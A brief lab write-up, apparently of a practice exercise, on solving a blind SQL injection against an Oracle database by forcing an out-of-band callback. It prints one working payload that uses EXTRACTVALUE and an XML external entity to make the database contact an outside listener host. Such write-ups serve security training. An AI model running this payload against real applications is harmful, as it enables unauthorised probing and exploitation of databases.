# Lab: Blind SQL injection with out-of-band interaction

**Date:** February 6, 2026
**Vulnerability Type:** Blind SQL Injection (OAST)
**Difficulty:** Practitioner
**Status:** SOLVED

## 1. Objective
Trigger an out-of-band (OAST) interaction with an external network listener from a backend Oracle database. This bypasses the limitations of "Blind" and "Time-based" SQLi where the application provides no direct feedback channel.

## 2. Discovery & Methodology
The target was identified as an Oracle database. To confirm the vulnerability, I utilized the `EXTRACTVALUE` function to trigger a DNS/HTTP request via an XML External Entity (XXE) injection.

### External Listener:
Since Burp Collaborator is restricted in the Community Edition, I utilized **Interact.sh** to capture outbound traffic.

### Injection Payload:
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://[YOUR-ID].oast.fun/"> %remote;]>'),'/l') FROM dual--
